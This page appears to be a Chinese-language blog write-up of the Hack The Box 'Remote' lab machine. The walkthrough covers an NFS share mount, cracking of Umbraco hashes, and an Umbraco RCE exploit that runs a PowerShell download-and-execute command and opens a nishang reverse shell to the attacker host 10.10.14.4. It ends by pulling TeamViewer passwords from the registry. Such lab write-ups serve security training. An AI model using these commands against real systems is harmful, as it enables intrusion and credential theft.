@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>remote | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan   #### port explore 21端口允许匿名登录，但是登录进去没有任何东西 80端口是一个网页，看不懂 111,135是rpc的端口，用rpcclient试一下空用户名 &#96;rpcclient -U &quot;&quot; -N 10.10.10.180 -p 111&#96; 拒绝连接 139,445是smb的端口，可以尝试smbclient登录一下 &#96;smbclient -N -L &#x2F;&#x2F;1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="remote">
+<meta property="og:url" content="http://example.com/2022/09/04/remote/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan   #### port explore 21端口允许匿名登录，但是登录进去没有任何东西 80端口是一个网页，看不懂 111,135是rpc的端口，用rpcclient试一下空用户名 &#96;rpcclient -U &quot;&quot; -N 10.10.10.180 -p 111&#96; 拒绝连接 139,445是smb的端口，可以尝试smbclient登录一下 &#96;smbclient -N -L &#x2F;&#x2F;1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/nmap1.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/nmap2.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/nmap3.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/nfs.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/mnt.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/user.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/admin.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/ss.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/payload.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/payload2.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/shell.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/dir.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/r.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/aes.png">
+<meta property="og:image" content="http://example.com/2022/09/04/remote/root.png">
+<meta property="article:published_time" content="2022-09-05T02:36:22.000Z">
+<meta property="article:modified_time" content="2022-09-05T07:00:12.635Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/09/04/remote/nmap1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-remote" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/09/04/remote/" class="article-date">
+  <time class="dt-published" datetime="2022-09-05T02:36:22.000Z" itemprop="datePublished">2022-09-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      remote
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/04/remote/nmap1.png">
+<img src="/2022/09/04/remote/nmap2.png">
+<img src="/2022/09/04/remote/nmap3.png">
+#### port explore
+21端口允许匿名登录，但是登录进去没有任何东西
+80端口是一个网页，看不懂
+111,135是rpc的端口，用rpcclient试一下空用户名
+`rpcclient -U "" -N 10.10.10.180 -p 111`
+拒绝连接
+139,445是smb的端口，可以尝试smbclient登录一下
+`smbclient -N -L //10.10.10.180`,失败
+2049端口是NFS服务，showmount可以给出挂载的路径和能够进行挂载的人
+<img src="/2022/09/04/remote/nfs.png">
+把这个目录挂载到自己的机器上：`mount -t nfs 10.10.10.180:/site_backups /mnt/`
+<img src="/2022/09/04/remote/mnt.png">
+在/App_Data下存在一个Umbraco.sdf的文件，.sdf是一种典型的数据库格式的文件
+直接查看的时候显示很混乱，但是当使用strings的时候，列出了一些用户名和密码
+<img src="/2022/09/04/remote/user.png">
+根据我们得到的信息可以推测存在一个admin@htb.local,且其hash为b8be16afba8c314ad33d812f22a04991b90e2aaa，加密算法为SHA1
+另一个用户为smith@htb.local,其hash为jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts=，加密算法为HMACSHA256
+拿到本地用hashcat破解一下
+`hashcat -m 100 adminpass -w=/usr/share/wordlist/rockyou.txt --force`
+<img src="/2022/09/04/remote/admin.png">
+密码为baconandcheese
+用这个用户名和密码我们能够登录到http://10.10.10.180/umbraco
+得到这个网站的version为7.12.4
+searchsploit umbraco看看，发现确实存在漏洞
+<img src="/2022/09/04/remote/ss.png">
+<img src="/2022/09/04/remote/payload.png">
+用法是用用户名加密码加要执行的命令
+<img src="/2022/09/04/remote/payload2.png">
+发现确实可以进行利用
+先让目标机从本地机器上下载一个shell
+把nishang下的revertcpshell.ps1修改一下，在最下面加上一行反弹shell的命令
+`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.4 -Port 8888`
+`python3 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "iex(new-object net.webclient).downloadstring('http://10.10.14.4/rev.ps1')"`
+成功接收到反弹的shell
+<img src="/2022/09/04/remote/shell.png">
+#### 目录扫描
+<img src="/2022/09/04/remote/dir.png">
+#### administrator
+查看目标机上运行的程序，会发现一个TeamViewer_Service.exe
+作为一个服务器，它一定存有凭据供别人进行远程登录
+这里可以先上传一个winpeas进行信息收集
+在C:\Program Files (x86)\TeamViewer内我们可以得到该teamviewer的版本为versin7
+根据cve-2019-18988，teamviewer将用户名和密码写在注册表里
+那我们可以查看一下注册表里的信息
+`cd HKLM:\software\wow6432node\teamviewer\version7`
+`get-itemproperty -path .`
+<img src="/2022/09/04/remote/r.png">
+接着列举SecurityPasswordAES
+`(get-itemproperty -path .).SecurityPasswordAES`
+<img src="/2022/09/04/remote/aes.png">
+对照msf中的破解teamviewer密码的脚本，创建一个python脚本
+得到远程登录的密码为!R3m0te!
+可以用crackmapexec,evil-winrm,psexec,wmiexec获得一个shell
+<img src="/2022/09/04/remote/root.png">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/04/remote/" data-id="cl7of3c970000lhcpdg9xb11r" data-title="remote" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/09/05/bastion/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          bastion
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/09/04/traverxec/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">traverxec</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/haircut/">haircut</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/cronos/">cronos</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/bastard/">bastard</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
